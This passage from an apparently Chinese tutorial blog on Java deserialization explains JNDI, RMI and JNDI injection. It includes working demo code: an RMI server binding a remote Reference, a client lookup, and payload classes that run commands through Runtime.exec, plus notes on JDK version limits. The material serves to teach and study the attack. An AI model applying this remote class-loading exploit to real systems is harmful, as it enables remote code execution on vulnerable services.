keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">jndi</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException<span class="token punctuation">,</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException <span class="token punctuation">{</span>        String url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8080"</span><span class="token punctuation">;</span>         Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reference reference <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>reference<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span>referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里可以看到调用完Reference后又调用了ReferenceWrapper将前面的Reference对象给传进去，这是为什么呢？</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/15.png"></div>其实查看Reference就可以知道原因，查看到Reference,并没有实现Remote接口也没有继承 UnicastRemoteObject类，前面讲RMI的时候说过，需要将类注册到Registry需要实现Remote和继承UnicastRemoteObject类。这里并没有看到相关的代码，所以这里还需要调用ReferenceWrapper将他给封装一下。<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>定义一个person类：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span>  <span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Remote</span><span class="token punctuation">,</span>Serializable <span class="token punctuation">{</span>     <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 1L<span class="token punctuation">;</span>      <span class="token keyword">private</span> String name<span class="token punctuation">;</span>      <span class="token keyword">private</span> String password<span class="token punctuation">;</span>      <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> name<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> String <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> password<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span>String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token string">"name:"</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">" password:"</span><span class="token operator">+</span>password<span class="token punctuation">;</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>服务端以RMI为例：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>demo<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RemoteException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>NamingException<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>spi<span class="token punctuation">.</span>NamingManager<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">initPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span>        LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">3001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span> <span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"rmi://localhost:3001"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">////初始化</span>        InitialContext ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//实例化person对象</span>        Person p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token punctuation">.</span><span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token string">"jndi"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//person对象绑定到JNDI服务中，JNDI的名字叫做：person。</span>        ctx<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"person"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">findPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了</span>        InitialContext ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//通过lookup查找person对象</span>        Person person <span class="token operator">=</span> <span class="token punctuation">(</span>Person<span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打印出这个对象</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token function">initPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">findPerson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调试信息：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/16.png"></div><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/17.png"></div><p>在initPerson方法中，注册了rmi服务并绑定了端口，给p对象命名为person，在findPerson方法中查找被命名为person的对象，然后通过。最终输出了hello jndi。</p><p><strong>Jndi Naming Reference：</strong></p><p>java为了将object对象存储在Naming或者Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming和Directory服务下，比如（rmi，ldap等）。在使用Reference的时候，我们可以直接把对象写在构造方法中，当被调用的时候，对象的方法就会被触发。理解了jndi和jndi reference后，就可以理解jndi注入产生的原因了。</p><h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>JNDI产生注入的四个原因：<br>1、lookup参数可控。<br>2、InitialContext类及他的子类的lookup方法允许动态协议转换<br>3、lookup查找的对象是Reference类型及其子类<br>4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。</p><p>还是上面那个例子，跟进到loopup函数中：</p><p>调用getURLOrDefaultInitCt函数:</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/18.png"></div><p>发现getURLOrDefaultInitCtx会返回两种情况，<br>第一种getDefaultInit()，<br>第二种是getUrlContext(scheme,myPorps)。</p><p>这说明即使 Context.PROVIDER_URL参数被初为rmi://127.0.0.1:1099/foo,但是如果lookup的参数可控，那我们就可以重写url地址，使url地址指向我们的服务器。例如：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">// Create the initial context</span>Hashtable env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>INITIAL_CONTEXT_FACTORY<span class="token punctuation">,</span><span class="token string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Context<span class="token punctuation">.</span>PROVIDER_URL<span class="token punctuation">,</span> <span class="token string">"rmi://secure-server:1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Look up in the local RMI registry</span>Object local_obj <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>attacker controlled<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就可以实现远程加载恶意的对象，实现远程代码执行。</p><p>我们发现存在3种方法，可以通过jndi注入导致远程代码执行:</p><ul><li>rmi、通过jndi reference远程调用object方法。</li><li>CORBA IOR 远程获取实现类</li><li>LDAP 通过序列化对象，JNDI Referene，ldap地址</li></ul><h2 id="RMI-JNDI注入demo"><a href="#RMI-JNDI注入demo" class="headerlink" title="RMI JNDI注入demo"></a>RMI JNDI注入demo</h2><p>Server端：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Registry使用1099端口</span>        Reference aa <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExecObj"</span><span class="token punctuation">,</span> <span class="token string">"ExecObj"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8081/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为类名为“ExecObj”的对象以及对象工厂的类名和位置构造一个新引用。</span>        ReferenceWrapper refObjWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将类注册到Registry需要实现Remote和继承UnicastRemoteObject类。这里并没有看到相关的代码，所以这里还需要调用ReferenceWrapper将他给封装一下。</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span> refObjWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Client端：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CLIENT</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/aa"</span><span class="token punctuation">;</span>        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ExecObj</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Reader<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>print<span class="token punctuation">.</span>attribute<span class="token punctuation">.</span>standard<span class="token punctuation">.</span>PrinterMessageFromOperator<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecObj</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span>InterruptedException<span class="token punctuation">{</span>        String cmd <span class="token operator">=</span> <span class="token string">"whoami"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> Process process <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printMessage</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printMessage</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> value <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> InputStream input<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                Reader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                BufferedReader bf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span><span class="token punctuation">;</span>                String line <span class="token operator">=</span> null<span class="token punctuation">;</span>                <span class="token keyword">try</span><span class="token punctuation">{</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line<span class="token operator">=</span>bf<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span><span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先javac ExecObj、将生成的class文件放在web服务器目录下。然后依次执行server端，client端</p><p>但是由于JDK 6u132,JDK 7u122,JDK 8u113中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/19.png"></div><p>接下来我们尝试去换低版本的jdk去完成一次利用，同时看看高版本怎么去绕过。</p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>RMI实现一个不同jvm直接程序调用的功能；<br>JNDI类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象；</p><p>RMI+JNDI的攻击方式由于限制使用较少：JDK 6u132,JDK 7u122,JDK 8u113都不可使用</p><p>ldap+JNDI的攻击方式使用更为广泛</p><h1 id="java反序列化入门（六）JNDI注入利用demo调试"><a href="#java反序列化入门（六）JNDI注入利用demo调试" class="headerlink" title="java反序列化入门（六）JNDI注入利用demo调试"></a>java反序列化入门（六）JNDI注入利用demo调试</h1><h2 id="回顾加简单总结"><a href="#回顾加简单总结" class="headerlink" title="回顾加简单总结"></a>回顾加简单总结</h2><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。就是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象，从而去访问和调用。</p><p>其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等。将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p><h2 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h2><p>功能是可以在两个jvm中可以调用java程序，不管这两个jvm是在一个pc还是两个pc。</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p>暂时还不知道</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>JNDI+RMI是一种比较老的利用思路，由于JDK 6u132,JDK 7u122,JDK 8u113中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/20.png"></div><p>接下来我们尝试去换低版本的jdk去完成一次利用，同时看看高版本怎么去绕过：</p><h2 id="jdk1-8-73复现JDNI-RMI攻击方式"><a href="#jdk1-8-73复现JDNI-RMI攻击方式" class="headerlink" title="jdk1.8.73复现JDNI+RMI攻击方式"></a>jdk1.8.73复现JDNI+RMI攻击方式</h2><h3 id="源码及原理讲解"><a href="#源码及原理讲解" class="headerlink" title="源码及原理讲解"></a>源码及原理讲解</h3><p>首先贴代码：</p><p>ExecTest</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Reader<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>print<span class="token punctuation">.</span>attribute<span class="token punctuation">.</span>standard<span class="token punctuation">.</span>PrinterMessageFromOperator<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecTest</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String cmd <span class="token operator">=</span> <span class="token string">"gnome-calculator"</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> Process process <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printMessage</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printMessage</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> value <span class="token operator">=</span> process<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[*] name is ==> "</span><span class="token operator">+</span>value<span class="token punctuation">)</span><span 